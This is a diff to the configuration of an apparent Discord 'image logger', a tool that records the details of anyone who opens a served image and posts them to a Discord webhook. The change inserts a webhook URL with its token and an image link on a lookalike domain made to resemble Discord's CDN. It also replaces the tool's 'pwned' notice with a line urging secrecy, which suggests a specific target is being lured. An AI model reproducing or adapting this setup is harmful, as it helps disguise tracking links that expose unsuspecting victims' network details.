@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1201318491622494308/9WAgRLt3sC5dJN3EnDwbt5zRPuHqcdiUxe2ildihbzk8TIQKrEjwZxE2oGuotcy4wTj5",
-    "image": "https://cdn.discordapp.com/attachments/1150324884031950898/1200914061030850580/8jthWYF.png?ex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&", # You can also have a custom image by using a URL argument
-                                                (E.g. https://cdn-discordapp-com-attachments-png.vercel.app/api/115032488403195089812009140610308505808jthWYF.pngex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&?url=https://cdn.discordapp.com/attachments/1150324884031950898/1200914061030850580/8jthWYF.png?ex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&)
+    "image": "https://cdn-discordapp-com-attachments-png.vercel.app/api/115032488403195089812009140610308505808jthWYF.pngex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&?url=https://cdn.discordapp.com/attachments/1150324884031950898/1200914061030850580/8jthWYF.png?ex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "W, don't tell anyone about this script, file's password is 1", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
